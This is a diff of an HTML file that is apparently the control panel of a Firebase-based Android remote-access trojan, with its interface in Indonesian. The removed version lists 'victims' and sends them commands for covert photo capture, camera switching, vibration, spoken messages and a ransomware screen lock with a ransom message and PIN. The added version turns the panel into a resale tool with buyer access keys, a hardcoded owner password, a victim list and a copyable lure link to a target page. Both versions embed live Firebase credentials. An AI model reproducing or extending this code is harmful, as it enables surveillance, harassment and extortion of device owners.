@@ -1,124 +1,119 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-    <title>ELVOXI MASTER</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>V-PROJECT MASTER CONTROL</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        :root { --neon: #ff0055; --bg: #050505; }
-        body { background: var(--bg); color: #fff; font-family: sans-serif; margin: 0; }
-        #page-list { padding: 20px; }
-        .device-card { background: #111; border: 1px solid #333; padding: 20px; border-radius: 12px; margin-bottom: 15px; cursor: pointer; display: flex; justify-content: space-between; border-left: 5px solid var(--neon); }
-        .header { position: fixed; top: 0; width: 100%; background: #000; border-bottom: 1px solid var(--neon); padding: 15px; z-index: 100; display: flex; align-items: center; box-sizing: border-box; }
-        .drawer { position: fixed; top: 0; left: -300px; width: 290px; height: 100%; background: #0a0a0a; border-right: 2px solid var(--neon); transition: 0.4s; z-index: 200; padding: 20px; box-sizing: border-box; overflow-y: auto; }
-        .drawer.active { left: 0; }
-        .menu-row { display: flex; align-items: center; justify-content: space-between; margin-bottom: 15px; background: #1a1a1a; padding: 10px; border-radius: 8px; }
-        .btn { padding: 8px 12px; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 11px; }
-        .btn-on { background: #0f0; color: #000; } .btn-off { background: #f00; color: #fff; }
-        .main-content { padding: 80px 20px; text-align: center; }
-        input { width: 100%; padding: 10px; background: #222; border: 1px solid #444; color: #fff; margin-bottom: 5px; border-radius: 5px; box-sizing: border-box; }
-        img { width: 100%; border-radius: 10px; border: 1px solid var(--neon); margin-top: 15px; }
-        .overlay { position: fixed; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); display: none; z-index: 150; }
-        .overlay.active { display: block; }
+        :root { --neon: #ffd700; --bg: #050505; --card: #111; }
+        body { background: var(--bg); color: #fff; font-family: 'Courier New', monospace; margin: 0; padding: 0; }
+        #auth { position: fixed; inset: 0; background: #000; z-index: 999; display: flex; flex-direction: column; justify-content: center; align-items: center; }
+        .card { border: 1px solid var(--neon); padding: 25px; border-radius: 15px; background: var(--card); width: 85%; max-width: 350px; text-align: center; box-shadow: 0 0 20px rgba(255, 215, 0, 0.2); }
+        input { width: 90%; padding: 12px; margin: 15px 0; background: #1a1a1a; border: 1px solid #444; color: var(--neon); text-align: center; border-radius: 8px; font-weight: bold; outline: none; }
+        #dash { display: none; padding: 20px; max-width: 500px; margin: auto; }
+        .target-card { background: var(--card); border: 1px solid #333; padding: 15px; margin-bottom: 15px; border-radius: 10px; border-left: 5px solid var(--neon); }
+        .btn-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin-top: 12px; }
+        .btn-rat { background: #222; color: #fff; border: 1px solid var(--neon); padding: 10px 2px; font-size: 9px; border-radius: 5px; cursor: pointer; font-weight: bold; }
+        .btn-main { background: var(--neon); color: #000; border: none; padding: 12px; font-weight: bold; border-radius: 8px; width: 100%; cursor: pointer; margin-top: 10px; }
     </style>
 </head>
 <body>
-    <div class="overlay" id="overlay" onclick="toggleDrawer()"></div>
-    <div id="page-list">
-        <h1 style="color:var(--neon); text-align:center;">ELVOXI | VICTIMS</h1>
-        <div id="targetList">Scanning...</div>
+
+    <div id="auth">
+        <div class="card">
+            <h2 style="color:var(--neon); margin:0;">V-PROJECT V12</h2>
+            <input type="password" id="key-input" placeholder="INPUT ACCESS KEY...">
+            <button onclick="login()" class="btn-main">LOGIN RAT</button>
+        </div>
     </div>
 
-    <div id="page-control" style="display:none;">
-        <div class="header">
-            <button onclick="toggleDrawer()" style="background:var(--neon); border:none; padding:10px; font-weight:bold; border-radius:5px; color:#fff;">☰ REMOTE</button>
-            <span id="activeName" style="margin-left:15px; color:var(--neon); font-weight:bold;"></span>
-            <button onclick="location.reload()" style="margin-left:auto; background:#333; border:none; color:white; padding:10px; border-radius:5px;">EXIT</button>
-        </div>
-
-        <div class="drawer" id="drawer">
-            <h3 style="color:var(--neon); text-align:center;">ELVOXI REMOTE</h3>
-            
-            <div class="menu-row"><span>KAMERA</span><div>
-                <button class="btn btn-on" onclick="switchCam('user')">DEPAN</button>
-                <button class="btn btn-off" onclick="switchCam('environment')">BKG</button>
-            </div></div>
-
-            <div class="menu-row"><span>FLASH</span><div>
-                <button class="btn btn-on" onclick="cmd('flash','on')">ON</button>
-                <button class="btn btn-off" onclick="cmd('flash','off')">OFF</button>
-            </div></div>
-
-            <div class="menu-row"><span>VIBRATE</span><div>
-                <button class="btn btn-on" onclick="cmd('vbt_on')">BOM</button>
-                <button class="btn btn-off" onclick="cmd('vbt_off')">OFF</button>
-            </div></div>
-
-            <input type="text" id="vT" placeholder="Pesan Suara..."><button class="btn btn-on" style="width:100%; margin-bottom:15px;" onclick="speak()">KIRIM SUARA</button>
-            
-            <div style="background:#1a1a1a; padding:10px; border-radius:8px; border:1px solid red;">
-                <span style="color:red; font-weight:bold;">RANSOMWARE LOCK</span>
-                <input type="text" id="rT" placeholder="Judul Lock">
-                <input type="text" id="rM" placeholder="Pesan Penebusan">
-                <input type="number" id="rP" placeholder="PIN Rahasia">
-                <button class="btn btn-off" style="width:100%" onclick="sendRansom()">SEND LOCK</button>
+    <div id="dash">
+        <div class="card" style="width:100%; max-width:100%; margin-bottom:20px; box-sizing:border-box;">
+            <b id="user-display" style="color:var(--neon)">USER: ...</b><br>
+            <button class="btn-main" onclick="salinLink()">📋 SALIN LINK TARGET GUA</button>
+            <div id="owner-tools" style="display:none; margin-top:15px; border-top:1px solid #333; padding-top:15px;">
+                <button onclick="buatKey()" style="background:#00ff00; width:100%; border:none; padding:10px; border-radius:5px; font-weight:bold;">+ CETAK KEY BUYER</button>
             </div>
         </div>
-
-        <div class="main-content">
-            <div id="dispModel" style="font-size:24px; color:var(--neon); font-weight:bold;">--</div>
-            <div id="dispBatt" style="color:#0f0; margin-bottom:20px;">Target Active</div>
-            <button class="btn btn-on" style="padding:15px; width:100%; font-size:16px;" onclick="cmd('snap')">📸 AMBIL FOTO</button>
-            <div id="photoArea"></div>
-        </div>
+        <h4 style="color:var(--neon)">VICTIM LIST (REAL-TIME):</h4>
+        <div id="list"></div>
     </div>
 
-    <script>
-        const firebaseConfig = {
-            apiKey: "AIzaSyAujMVUdlPs4XGzTTq_o51kRil4OYZ5JoU",
-            authDomain: "elvoxi-ganteng.firebaseapp.com",
-            databaseURL: "https://elvoxi-ganteng-default-rtdb.asia-southeast1.firebasedatabase.app",
-            projectId: "elvoxi-ganteng",
-            storageBucket: "elvoxi-ganteng.firebasestorage.app",
-            messagingSenderId: "88989958637",
-            appId: "1:88989958637:web:c1d21102ef24bbf6de27e4"
-        };
-        firebase.initializeApp(firebaseConfig);
-        const db = firebase.database();
-        let selectedID = "";
+<script>
+    // === TEMPEL CONFIG FIREBASE DI SINI ===
+    const linkWebTarget = "https://elvoxi.github.io/newcallingelvoxianjaikwkw/target.html"; 
+    const firebaseConfig = {
+  apiKey: "AIzaSyAddYZVOXibzxIWNTNwqqQn5n7QUrQN6ys",
+  authDomain: "rat-html.firebaseapp.com",
+  databaseURL: "https://rat-html-default-rtdb.asia-southeast1.firebasedatabase.app",
+  projectId: "rat-html",
+  storageBucket: "rat-html.firebasestorage.app",
+  messagingSenderId: "1060124583265",
+  appId: "1:1060124583265:web:7988dc574a1be9f10f5120",
+  measurementId: "G-SP76CHQ5XN"
+};
+    // ======================================
 
-        db.ref('targets').on('value', (s) => {
-            const list = document.getElementById('targetList'); list.innerHTML = "";
-            s.forEach(child => {
-                const id = child.key; const d = child.val();
-                list.innerHTML += `<div class="device-card" onclick="openControl('${id}','${d.model}')"><span>📱 <b>${d.model}</b></span><span style="color:#0f0">● ONLINE</span></div>`;
-                if(id === selectedID && d.foto) {
-                    document.getElementById('photoArea').innerHTML = `<img src="${d.foto}"><br><a href="${d.foto}" download="foto.jpg"><button class="btn btn-on" style="margin-top:10px; width:100%">SIMPAN FOTO</button></a>`;
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+    let myKey = "";
+    let amIOwner = false;
+
+    function login() {
+        const val = document.getElementById('key-input').value;
+        if(val === "elvoxi122") {
+            myKey = "OWNER"; amIOwner = true;
+            document.getElementById('owner-tools').style.display = 'block';
+            start();
+        } else if(val.startsWith("VPRJ-")) {
+            db.ref('mario/all_keys/' + val).once('value', (s) => {
+                if(s.exists()) { myKey = val; amIOwner = false; start(); }
+                else alert("KEY GAK ADA DI DATABASE!");
+            });
+        } else alert("FORMAT SALAH!");
+    }
+
+    function start() {
+        document.getElementById('auth').style.display = 'none';
+        document.getElementById('dash').style.display = 'block';
+        document.getElementById('user-display').innerText = "USER: " + myKey;
+        
+        db.ref('mario/targets').on('value', (snap) => {
+            const container = document.getElementById('list');
+            container.innerHTML = "";
+            snap.forEach((child) => {
+                const data = child.val();
+                if(amIOwner || data.belongsTo === myKey) {
+                    container.innerHTML += `
+                        <div class="target-card">
+                            ${amIOwner ? `<small style="color:#555">BUYER: ${data.belongsTo}</small><br>` : ''}
+                            <b style="color:var(--neon)">${data.model}</b>
+                            <div class="btn-grid">
+                                <button class="btn-rat" onclick="cmd('${child.key}', 'torch_on')">SENTER</button>
+                                <button class="btn-rat" onclick="cmd('${child.key}', 'vibrate')">GETAR</button>
+                                <button class="btn-rat" onclick="cmd('${child.key}', 'play_audio')">SUARA</button>
+                            </div>
+                        </div>`;
                 }
             });
         });
+    }
 
-        function openControl(id, model) {
-            selectedID = id;
-            document.getElementById('page-list').style.display = 'none';
-            document.getElementById('page-control').style.display = 'block';
-            document.getElementById('activeName').innerText = model;
-            document.getElementById('dispModel').innerText = model;
-        }
-        function toggleDrawer() { document.getElementById('drawer').classList.toggle('active'); document.getElementById('overlay').classList.toggle('active'); }
-        function cmd(type, stat='') { db.ref('commands/'+selectedID).push({type: type, status: stat}); }
-        function switchCam(m) { db.ref('commands/'+selectedID).push({type: 'switch_cam', mode: m}); alert("Camera Switch Sent!"); }
-        function speak() { const t = document.getElementById('vT').value; db.ref('commands/'+selectedID).push({type:'speak', text:t || "Dongo"}); document.getElementById('vT').value=""; }
-        function sendRansom() {
-            db.ref('commands/'+selectedID).push({
-                type: "lock",
-                title: document.getElementById('rT').value || "DEVICE ENCRYPTED",
-                msg: document.getElementById('rM').value || "Pay to unlock.",
-                pin: document.getElementById('rP').value || "1234"
-            });
-            alert("Lock Sent!"); toggleDrawer();
-        }
-    </script>
+    function cmd(id, act) { db.ref(`mario/commands/${id}`).set({ action: act, time: Date.now() }); }
+    function salinLink() {
+        const link = `${linkWebTarget}?key=${myKey}`;
+        const t = document.createElement('textarea'); t.value = link;
+        document.body.appendChild(t); t.select(); document.execCommand('copy');
+        document.body.removeChild(t);
+        alert("Link Target Berhasil Disalin!");
+    }
+    function buatKey() {
+        const k = "VPRJ-" + Math.random().toString(36).substr(2, 6).toUpperCase();
+        db.ref('mario/all_keys/' + k).set({ created: Date.now() });
+        alert("KEY BARU: " + k);
+    }
+</script>
 </body>
-    </html>
+</html>
